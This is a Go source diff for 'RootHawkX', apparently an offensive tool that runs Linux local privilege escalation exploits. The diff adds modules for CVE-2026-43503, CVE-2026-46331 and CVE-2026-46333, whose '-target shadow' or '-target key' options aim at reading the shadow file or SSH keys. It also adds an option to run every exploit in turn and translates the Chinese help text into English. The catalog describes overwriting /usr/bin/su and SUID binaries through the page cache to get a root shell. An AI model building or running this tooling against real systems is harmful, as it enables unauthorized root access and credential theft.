@@ -16,7 +16,10 @@ import (
 	"roothawk/pkg/exploits/cve20220847"
 	"roothawk/pkg/exploits/cve202631431"
 	"roothawk/pkg/exploits/cve202643284"
+	"roothawk/pkg/exploits/cve202643503"
 	"roothawk/pkg/exploits/cve202646300"
+	"roothawk/pkg/exploits/cve202646331"
+	"roothawk/pkg/exploits/cve202646333"
 	"roothawk/pkg/exploits/dirtydecrypt"
 	"roothawk/pkg/exploits/pintheft"
 	"roothawk/pkg/logger"
@@ -38,6 +41,7 @@ type runOptions struct {
 	PKExecPath   string
 	BackupPath   string
 	RootExecPath string
+	Target       string
 	Verbose      bool
 }
 
@@ -47,7 +51,7 @@ var catalog = []exploitDef{
 		Aliases:   []string{"cve-2026-31431", "copyfail", "copy-fail", "copy fail"},
 		Name:      "Copy Fail",
 		RunName:   "CopyFail",
-		Component: "Linux Kernel 本地提权，涉及 crypto / AF_ALG / algif_aead 相关逻辑问题。",
+		Component: "Linux kernel LPE exploiting crypto / AF_ALG / algif_aead logical flaws.",
 		Run: func(options runOptions) error {
 			cve202631431.Run(options.BackupPath, options.RootExecPath)
 			return nil
@@ -56,11 +60,21 @@ var catalog = []exploitDef{
 	{
 		ID:        "CVE-2026-43284",
 		Aliases:   []string{"cve-2026-43284", "cve-2026-43500", "dirty frag", "copyfail2", "copyfail-2"},
-		Name:      "Dirty Frag，也有人叫 CopyFail2",
+		Name:      "Dirty Frag, aka CopyFail2",
 		RunName:   "Dirty Frag",
-		Component: "Linux Kernel 本地提权，涉及 xfrm/esp、shared skb frags 等内核网络/数据包处理路径。",
+		Component: "Linux kernel LPE involving xfrm/esp and shared skb frags in network stack.",
 		Run: func(options runOptions) error {
 			return cve202643284.Run(options.Verbose)
+		},
+	},
+	{
+		ID:        "CVE-2026-43503",
+		Aliases:   []string{"cve-2026-43503", "dirtyclone", "dirty-clone"},
+		Name:      "DirtyClone",
+		RunName:   "DirtyClone",
+		Component: "Linux kernel LPE via net/skbuff shared fragment cloning.",
+		Run: func(options runOptions) error {
+			return cve202643503.Run(options.Verbose)
 		},
 	},
 	{
@@ -68,27 +82,47 @@ var catalog = []exploitDef{
 		Aliases:   []string{"cve-2026-46300", "fragnesia"},
 		Name:      "Fragnesia",
 		RunName:   "Fragnesia",
-		Component: "Linux Kernel 本地提权，利用 XFRM ESP-in-TCP 子系统的逻辑bug，通过 page cache 覆写 /usr/bin/su 获取 root shell。",
+		Component: "Linux kernel LPE exploiting XFRM ESP-in-TCP subsystem flaw to overwrite /usr/bin/su via page cache.",
 		Run: func(options runOptions) error {
 			return cve202646300.Run(options.Verbose)
 		},
 	},
 	{
+		ID:        "CVE-2026-46331",
+		Aliases:   []string{"cve-2026-46331", "cow", "pedit", "cve-2026-46331 cow"},
+		Name:      "Linux Kernel COW Bug (net/sched act_pedit)",
+		RunName:   "Linux Kernel COW",
+		Component: "Linux kernel LPE via net/sched act_pedit to overwrite kernel dirty data.",
+		Run: func(options runOptions) error {
+			return cve202646331.Run(options.Verbose)
+		},
+	},
+	{
+		ID:        "CVE-2026-46333",
+		Aliases:   []string{"cve-2026-46333", "keysign", "ssh-keysign-pwn"},
+		Name:      "ssh-keysign-pwn",
+		RunName:   "ssh-keysign-pwn",
+		Component: "Linux kernel LPE race condition in process exit path allowing info disclosure. Use -target shadow or -target key.",
+		Run: func(options runOptions) error {
+			return cve202646333.Run(options.Target, options.Verbose)
+		},
+	},
+	{
 		ID:        "pintheft",
-		Aliases:   []string{"pin-theft", "PinTheft"},
+		Aliases:   []string{"CVE-2026-43494", "pin-theft", "PinTheft"},
 		Name:      "PinTheft",
 		RunName:   "PinTheft",
-		Component: "Linux Kernel 本地提权，利用 RDS zerocopy double-free + io_uring page cache overwrite，覆写 SUID 二进制页面缓存获取 root shell。",
+		Component: "Linux kernel LPE (CVE-2026-43494) utilizing RDS zerocopy double-free + io_uring page cache overwrite for a root shell.",
 		Run: func(options runOptions) error {
 			return pintheft.Run(options.Verbose)
 		},
 	},
 	{
 		ID:        "dirtydecrypt",
-		Aliases:   []string{"dirty-decrypt", "dirtycbc", "dirty-cbc", "DirtyDecrypt", "DirtyCBC"},
+		Aliases:   []string{"CVE-2026-31635", "dirty-decrypt", "dirtycbc", "dirty-cbc", "DirtyDecrypt", "DirtyCBC"},
 		Name:      "DirtyDecrypt / DirtyCBC",
 		RunName:   "DirtyDecrypt",
-		Component: "Linux Kernel 本地提权，利用 rxgk_decrypt_skb() 缺少 COW 保护导致 page cache 写入，覆写 SUID 二进制获取 root shell。",
+		Component: "Linux kernel LPE (CVE-2026-31635) utilizing rxgk_decrypt_skb() missing COW protection for page cache overwrite.",
 		Run: func(options runOptions) error {
 			return dirtydecrypt.Run(options.Verbose)
 		},
@@ -98,7 +132,7 @@ var catalog = []exploitDef{
 		Aliases:   []string{"cve-2021-4034", "pwnkit", "pkexec"},
 		Name:      "PwnKit",
 		RunName:   "PwnKit",
-		Component: "Polkit 的 pkexec 本地提权漏洞。",
+		Component: "Polkit pkexec local privilege escalation.",
 		Run: func(options runOptions) error {
 			return cve20214034.Run(options.PKExecPath)
 		},
@@ -106,9 +140,9 @@ var catalog = []exploitDef{
 	{
 		ID:        "CVE-2021-3560",
 		Aliases:   []string{"cve-2021-3560", "polkit:CVE-2021-3560", "polkit dbus", "polkit authentication bypass"},
-		Name:      "Polkit D-Bus 权限绕过 / Polkit Authentication Bypass",
+		Name:      "Polkit D-Bus Authentication Bypass",
 		RunName:   "Polkit Authentication Bypass",
-		Component: "Polkit 本地提权，可通过 D-Bus 请求绕过凭据检查，提升权限；没有像 PwnKit 那样特别统一的短名字。",
+		Component: "Polkit LPE via D-Bus requests bypassing credential checks.",
 		Run: func(options runOptions) error {
 			return runExploitModule(cve20213560.New())
 		},
@@ -118,7 +152,7 @@ var catalog = []exploitDef{
 		Aliases:   []string{"cve-2022-0847", "dirty pipe", "dirtypipe", "kernel:CVE-2022-0847"},
 		Name:      "Dirty Pipe",
 		RunName:   "Dirty Pipe",
-		Component: "Linux Kernel 本地提权，管道机制相关漏洞。",
+		Component: "Linux kernel LPE via pipe mechanism.",
 		Run: func(options runOptions) error {
 			return runExploitModule(cve20220847.New())
 		},
@@ -134,6 +168,7 @@ func main() {
 		pkexecPath       string
 		copyFailBackup   string
 		copyFailExecPath string
+		targetOption     string
 		verbose          bool
 	)
 
@@ -144,6 +179,7 @@ func main() {
 	flag.StringVar(&pkexecPath, "pk", "/usr/bin/pkexec", "pkexec path for CVE-2021-4034")
 	flag.StringVar(&copyFailBackup, "backup", "", "backup path for CVE-2026-31431 before overwriting su")
 	flag.StringVar(&copyFailExecPath, "exec", "", "CVE-2026-31431: command path to run as root instead of spawning su")
+	flag.StringVar(&targetOption, "target", "", "specify a target function/module (e.g. shadow or key for CVE-2026-46333)")
 	flag.BoolVar(&verbose, "v", false, "verbose output where supported")
 	flag.Usage = printHelp
 	flag.Parse()
@@ -152,6 +188,7 @@ func main() {
 		PKExecPath:   pkexecPath,
 		BackupPath:   copyFailBackup,
 		RootExecPath: copyFailExecPath,
+		Target:       targetOption,
 		Verbose:      verbose,
 	}
 
@@ -181,11 +218,11 @@ func main() {
 }
 
 func banner() {
-	fmt.Println(cyan("   ____              __  __                __"))
-	fmt.Println(cyan("  / __ \\____  ____  / /_/ /_  ____ __    / /__"))
-	fmt.Println(cyan(" / /_/ / __ \\/ __ \\/ __/ __ \\/ __ `/ |  / / _ \\"))
-	fmt.Println(cyan("/ _, _/ /_/ / /_/ / /_/ / / / /_/ /| |_/ /  __/"))
-	fmt.Println(cyan("/_/ |_|\\____/\\____/\\__/_/ /_/\\__,_/ |___/\\___/"))
+	fmt.Println(cyan("    ____              __  __  __               __  _  __"))
+	fmt.Println(cyan("   / __ \\____  ____  / /_/ / / /___ __      __/ /_| |/ /"))
+	fmt.Println(cyan("  / /_/ / __ \\/ __ \\/ __/ /_/ / __ `/ | /| / / //_/   / "))
+	fmt.Println(cyan(" / _, _/ /_/ / /_/ / /_/ __  / /_/ /| |/ |/ / ,< /   |  "))
+	fmt.Println(cyan("/_/ |_|\\____/\\____/\\__/_/ /_/\\__,_/ |__/|__/_/|_/_/|_|  "))
 	fmt.Printf("%s %s\n\n", yellow("RootHawkX"), faint("Linux local privilege escalation runner v"+version))
 }
 
@@ -196,14 +233,15 @@ func printHelp() {
 	fmt.Println("  RootHawkX -any [options]")
 	fmt.Println()
 	fmt.Println("Options:")
-	fmt.Println("  -list              显示当前集成的 CVE")
-	fmt.Println("  -e <name>          执行指定 CVE，例如 -e CVE-2022-0847")
-	fmt.Println("  -any               按列表顺序执行全部漏洞")
-	fmt.Println("  -pk <path>         CVE-2021-4034 的 pkexec 路径，默认 /usr/bin/pkexec")
-	fmt.Println("  -backup <path>     CVE-2026-31431 执行前备份 su 到指定路径")
-	fmt.Println("  -exec <path>       CVE-2026-31431 提权后执行指定程序，而不是进入 su")
-	fmt.Println("  -v                 尽量输出详细日志")
-	fmt.Println("  -help              显示帮助")
+	fmt.Println("  -list              List integrated CVEs")
+	fmt.Println("  -e <name>          Execute specific CVE by name (e.g. -e CVE-2022-0847)")
+	fmt.Println("  -any               Execute all exploits sequentially")
+	fmt.Println("  -pk <path>         Path to pkexec for CVE-2021-4034 (default: /usr/bin/pkexec)")
+	fmt.Println("  -backup <path>     Path to backup su before execution for CVE-2026-31431")
+	fmt.Println("  -exec <path>       Command path to run as root instead of spawning su for CVE-2026-31431")
+	fmt.Println("  -target <name>     Specify target module/function (e.g., key or shadow for CVE-2026-46333)")
+	fmt.Println("  -v                 Verbose output")
+	fmt.Println("  -help              Show this help menu")
 	fmt.Println()
 	fmt.Println("Examples:")
 	fmt.Println("  RootHawkX -list")
@@ -217,14 +255,14 @@ func printList() {
 	fmt.Printf("%s\n", green("[+] RootHawkX supported CVEs"))
 	for _, item := range catalog {
 		fmt.Printf("\n  %s\n", red(item.ID))
-		fmt.Printf("      %s %s\n", yellow("别名:"), cyan(item.Name))
-		fmt.Printf("      %s %s\n", yellow("描述:"), item.Component)
+		fmt.Printf("      %s %s\n", yellow("Alias:"), cyan(item.Name))
+		fmt.Printf("      %s %s\n", yellow("Desc :"), item.Component)
 	}
 }
 
 func runAll(options runOptions) {
 	for _, item := range catalog {
-		fmt.Printf("\n%s Running %s（%s）\n", cyan("[*]"), green(item.RunName), red(item.ID))
+		fmt.Printf("\n%s Running %s (%s)\n", cyan("[*]"), green(item.RunName), red(item.ID))
 		if err := runChild(item.ID, options); err != nil {
 			fmt.Fprintf(os.Stderr, "%s\n", red("[-] "+err.Error()))
 			continue
@@ -245,6 +283,9 @@ func runChild(name string, options runOptions) error {
 	if options.RootExecPath != "" {
 		args = append(args, "-exec", options.RootExecPath)
 	}
+	if options.Target != "" {
+		args = append(args, "-target", options.Target)
+	}
 	if options.Verbose {
 		args = append(args, "-v")
 	}
@@ -260,7 +301,7 @@ func runExploit(name string, options runOptions) error {
 	if !ok {
 		return fmt.Errorf("unknown exploit %q, use -list to see supported names", name)
 	}
-	fmt.Printf("%s Running %s（%s）\n", cyan("[*]"), green(item.RunName), red(item.ID))
+	fmt.Printf("%s Running %s (%s)\n", cyan("[*]"), green(item.RunName), red(item.ID))
 	return item.Run(options)
 }
 
